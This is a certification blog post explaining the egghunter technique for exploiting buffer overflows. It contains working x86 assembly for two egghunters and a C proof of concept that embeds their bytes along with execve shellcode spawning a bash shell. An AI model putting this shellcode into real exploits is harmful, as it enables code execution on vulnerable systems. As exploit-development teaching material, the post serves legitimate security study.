<i>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</i><br /><i> </i><i><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></i><br /><i> </i><i><b>Student ID:</b>&nbsp;SLAE-885</i><br /><i><b>Assignment number: </b>3</i><br /><i><b>Github repo:</b> <a href="https://github.com/abatchy17/SLAE">https://github.com/abatchy17/SLAE</a></i><br /><br /><i>Note: Pretty much the entire post is extracted from Skape's paper, it's extremely well-written and is a must read. </i><br /><h2>What is an egghunter?</h2><br />Assume you found a buffer overflow vulnerability with a very small space that you control that is less than that of a bind/reverse shell, how can you utilize this space? The following concept is discussed in depth by Skape in <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a> where the actual payload is marked by an "egg" (usually 4-8 bytes that are very unlikely to be found in memory) and the small controllable space contains an "egghunter" which will search for that egg in the virtual address space.<br /><br />Skape discussed 3 different implementations for Linux, I implemented both access(2) and access(2) revised.<br /><br /><h2>What are the requirements of an egg hunter?</h2>1. Small size: Since the main reason an egg hunter is needed is that we're tight on space, the smaller the shellcode is, the better. This is achieved by writing a very optimized shellcode.<br /><br />2. Robustness: It should be able to scan the entire virtual space fast without failing on unallocated memory. This is achieved through multiple methods on Linux, discussed below.<br /><br />If you directly try to read an unallocated memory in Linux, program will throw a SIGSEGV and crash. Instead, Skape recommended an out of the box suggestion, which is abusing the access() syscall.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #00aaaa;">int</span> <span style="color: #00aa00;">access</span>(<span style="color: #0000aa;">const</span> <span style="color: #00aaaa;">char</span> *pathname, <span style="color: #00aaaa;">int</span> mode);<br /></pre></div><br />Passing an address instead of pathname will check if the memory is allocated, if not it won't throw a SIGSEGV, allowing us to scan the memory safely.<br /><br />One more thing is that we need to make sure that the egg hunter won't ultimately point at itself, that's why the code will check the presence of the egg twice in a row before concluding that this is our payload.<br /><h2>How does the egg hunter work?</h2><b>Method 1:</b> access(2)<br /><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #9999a9;">;   Skape's egghunter: access(2)</span><br /><span style="color: #9999a9;">;</span>&nbsp;</pre><pre style="background: #000000; color: #d1d1d1;">&nbsp;</pre><pre style="background: #000000; color: #d1d1d1;"><span style="color: #008073;">global</span> _start<span style="color: #d2cd86;">:</span><br /><br /><span style="color: #008073;">section</span> .text<br /><br /><span style="color: #e34adc;">_start:</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">ebx</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x50905090</span>     <span style="color: #9999a9;">; Store EGG in ebx</span><br />    <span style="color: #e66170; font-weight: bold;">xor</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">ecx</span>            <span style="color: #9999a9;">; Zero out ECX</span><br />    <span style="color: #e66170; font-weight: bold;">mul</span> <span style="color: #d0d09f;">ecx</span>                 <span style="color: #9999a9;">; Zero out EAX and EDX</span><br /><span style="color: #e34adc;">IncPage:</span>                    <span style="color: #9999a9;">; JMP to increment page number</span><br />    <span style="color: #e66170; font-weight: bold;">or</span> <span style="color: #d0d09f;">dx</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xfff</span>            <span style="color: #9999a9;">; Align page address</span><br /><span style="color: #e34adc;">IncAddr:</span>                    <span style="color: #9999a9;">; JMP to increment address</span><br />    <span style="color: #e66170; font-weight: bold;">inc</span> <span style="color: #d0d09f;">edx</span>                 <span style="color: #9999a9;">; Go to next address</span><br />    <span style="color: #e66170; font-weight: bold;">pushad</span>                  <span style="color: #9999a9;">; Push general registers onto stack</span><br />    <span style="color: #e66170; font-weight: bold;">lea</span> <span style="color: #d0d09f;">ebx</span><span style="color: #d2cd86;">,</span> <span style="color: #d2cd86;">[</span><span style="color: #d0d09f;">edx</span><span style="color: #d2cd86;">+</span><span style="color: #008c00;">4</span><span style="color: #d2cd86;">]</span>        <span style="color: #9999a9;">; [edx+4] so we can compare [edx] and [edx+4] at the same time</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">al</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x21</span>            <span style="color: #9999a9;">; syscall for access()</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span>                <span style="color: #9999a9;">; call access() to check memory location [EBX]</span><br />    <span style="color: #e66170; font-weight: bold;">cmp</span> <span style="color: #d0d09f;">al</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xf2</span>            <span style="color: #9999a9;">; Did it return EFAULT?</span><br />    <span style="color: #e66170; font-weight: bold;">popad</span>                   <span style="color: #9999a9;">; Restore registers</span><br />    <span style="color: #e66170; font-weight: bold;">jz</span> <span style="color: #e34adc;">IncPage</span>              <span style="color: #9999a9;">; access() returned EFAULT, skip page</span><br />    <span style="color: #e66170; font-weight: bold;">cmp</span> <span style="color: #d2cd86;">[</span><span style="color: #d0d09f;">edx</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">ebx</span>          <span style="color: #9999a9;">; initialized memory, check if EGG is in [edx]</span><br />    <span style="color: #e66170; font-weight: bold;">jnz</span> <span style="color: #e34adc;">IncAddr</span>             <span style="color: #9999a9;">; EGG isn't in [edx], visit next address</span><br />    <span style="color: #e66170; font-weight: bold;">cmp</span> <span style="color: #d2cd86;">[</span><span style="color: #d0d09f;">edx</span><span style="color: #d2cd86;">+</span><span style="color: #008c00;">4</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">ebx</span>        <span style="color: #9999a9;">; EGG is found in [edx], is it in [edx+4] too?</span><br />    <span style="color: #e66170; font-weight: bold;">jne</span> <span style="color: #e34adc;">IncAddr</span>             <span style="color: #9999a9;">; Boohoo! It wasn't. Visit next address</span><br />    <span style="color: #e66170; font-weight: bold;">jmp</span> <span style="color: #e34adc;">edx</span>                 <span style="color: #9999a9;">; [edx][edx+4] contain EGGEGG, we found our shellcode! Execute meaningless EGGEGG instructions then our payload</span><br /></pre><br /><b>Method 2:</b> access(2) revised<br /><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #9999a9;">;   Skape's egghunter: access(2) revised</span><br /><span style="color: #9999a9;">;</span><br /><br /><span style="color: #008073;">global</span> _start<br /><br /><span style="color: #008073;">section</span> .text<br /><br /><span style="color: #e34adc;">_start:</span><br />    <span style="color: #e66170; font-weight: bold;">xor</span> <span style="color: #d0d09f;">edx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">edx</span>            <span style="color: #9999a9;">; EDX = 0</span><br /><span style="color: #e34adc;">IncPage:</span><br />    <span style="color: #e66170; font-weight: bold;">or</span> <span style="color: #d0d09f;">dx</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xfff</span>            <span style="color: #9999a9;">; Align page address</span><br /><span style="color: #e34adc;">IncAddr:</span><br />    <span style="color: #e66170; font-weight: bold;">inc</span> <span style="color: #d0d09f;">edx</span>                 <span style="color: #9999a9;">; Go to next address</span><br />    <span style="color: #e66170; font-weight: bold;">lea</span> <span style="color: #d0d09f;">ebx</span><span style="color: #d2cd86;">,</span> <span style="color: #d2cd86;">[</span><span style="color: #d0d09f;">edx</span><span style="color: #d2cd86;">+</span><span style="color: #00a800;">0x4</span><span style="color: #d2cd86;">]</span>      <span style="color: #9999a9;">; [edx+4] so we can compare [edx] and [edx+4] at the same time</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #00a800;">0x21</span>          <span style="color: #9999a9;">; syscall for access()</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">eax</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span>                <span style="color: #9999a9;">; call access() to check memory location [EBX]</span><br />    <span style="color: #e66170; font-weight: bold;">cmp</span> <span style="color: #d0d09f;">al</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xf2</span>            <span style="color: #9999a9;">; Did it return EFAULT?</span><br />    <span style="color: #e66170; font-weight: bold;">jz</span> <span style="color: #e34adc;">IncPage</span>              <span style="color: #9999a9;">; It did, skip page</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">eax</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x50905090</span>     <span style="color: #9999a9;">; Store EGG in EAX</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">edi</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">edx</span>            <span style="color: #9999a9;">; Move EDX to EDI for scasd operation</span><br />    <span style="color: #e66170; font-weight: bold;">scasd</span>                   <span style="color: #9999a9;">; Check if [EDI] == EAX then increment EDI</span><br />    <span style="color: #e66170; font-weight: bold;">jnz</span> <span style="color: #e34adc;">IncAddr</span>             <span style="color: #9999a9;">; It isn't, increment address</span><br />    <span style="color: #e66170; font-weight: bold;">scasd</span>                   <span style="color: #9999a9;">; Check if [EDI] == EAX then increment EDI</span><br />    <span style="color: #e66170; font-weight: bold;">jnz</span> <span style="color: #e34adc;">IncAddr</span>             <span style="color: #9999a9;">; It isn't, increment address</span><br />    <span style="color: #e66170; font-weight: bold;">jmp</span> <span style="color: #e34adc;">edi</span>                 <span style="color: #9999a9;">; We found our Egg! JMP to EDI, which points directly to our shellcode</span><br /></pre><br /><h2>Proof of concept</h2><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #008800; font-style: italic;">/*</span><br /><span style="color: #008800; font-style: italic;"> egghunter.c</span><br /><span style="color: #008800; font-style: italic;"> By Abatchy</span><br /><span style="color: #008800; font-style: italic;"> gcc </span><span style="color: #008800; font-style: italic;"><span style="color: #008800; font-style: italic;">egghunter</span>.c -fno-stack-protector -z execstack -o shellcode.out</span><br /><span style="color: #008800; font-style: italic;">*/</span><br /><br /><span style="color: teal;">#include &lt;stdio.h&gt;</span><br /><span style="color: teal;">#include &lt;string.h&gt;</span><br /><br /><span style="color: teal;">#define EGG "\x90\x50\x90\x50"</span><br /><br /><span style="color: #008800; font-style: italic;">// Spawns a bash shell</span><br /><span style="color: navy; font-weight: bold;">unsigned</span> <span style="color: navy; font-weight: bold;">char</span> secret[] = EGG EGG<br /><span style="color: blue;">"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;<br /><br /><span style="color: #008800; font-style: italic;">// Skape's egghunter: access(2)</span><br /><span style="color: navy; font-weight: bold;">unsigned</span> <span style="color: navy; font-weight: bold;">char</span> egghunter1[] = <br /><span style="color: blue;">"\xbb"</span><br />EGG<br /><span style="color: blue;">"\x31\xc9"</span><br /><span style="color: blue;">"\xf7\xe1"</span><br /><span style="color: blue;">"\x66\x81\xca\xff\x0f"</span><br /><span style="color: blue;">"\x42"</span><br /><span style="color: blue;">"\x60"</span><br /><span style="color: blue;">"\x8d\x5a\x04"</span><br /><span style="color: blue;">"\xb0\x21"</span><br /><span style="color: blue;">"\xcd\x80"</span><br /><span style="color: blue;">"\x3c\xf2"</span><br /><span style="color: blue;">"\x61"</span><br /><span style="color: blue;">"\x74\xed"</span><br /><span style="color: blue;">"\x39\x1a"</span><br /><span style="color: blue;">"\x75\xee"</span><br /><span style="color: blue;">"\x39\x5a\x04"</span><br /><span style="color: blue;">"\x75\xe9"</span><br /><span style="color: blue;">"\xff\xe2"</span>;<br /><br /><span style="color: #008800; font-style: italic;">// Skape's egghunter: access(2) revised</span><br /><span style="color: navy; font-weight: bold;">unsigned</span> <span style="color: navy; font-weight: bold;">char</span> egghunter2[] = <br /><span style="color: blue;">"\x31\xd2"</span><br /><span style="color: blue;">"\x66\x81\xca\xff\x0f"</span><br /><span style="color: blue;">"\x42"</span><br /><span style="color: blue;">"\x8d\x5a\x04"</span><br /><span style="color: blue;">"\x6a\x21"</span><br /><span style="color: blue;">"\x58"</span><br /><span style="color: blue;">"\xcd\x80"</span><br /><span style="color: blue;">"\x3c\xf2"</span><br /><span style="color: blue;">"\x74\xee"</span><br /><span style="color: blue;">"\xb8"</span> EGG<br /><span style="color: blue;">"\x89\xd7"</span><br /><span style="color: blue;">"\xaf"</span><br /><span style="color: blue;">"\x75\xe9"</span><br /><span style="color: blue;">"\xaf"</span><br /><span style="color: blue;">"\x75\xe6"</span><br /><span style="color: blue;">"\xff\xe7"</span>;<br /><br /><span style="color: navy; font-weight: bold;">int</span> main()<br />{<br />    printf(<span style="color: blue;">"Egg is at %p\n"</span>, secret);<br />    printf(<span style="color: blue;">"Egghunter size: %d\n"</span>, strlen(egghunter1));<br />    <span style="color: navy; font-weight: bold;">int</span> (*ret)() = (<span style="color: navy; font-weight: bold;">int</span>(*)())egghunter1;<br />    ret();<br />}<br /></pre></div><br />Successfully running this code will search for the EGG in the memory and execute the payload, throwing a bash shell. Using <b>strace ./program</b> is a nice way to check if it's searching memory properly, or attaching GDB.<br /><br />- Abatchy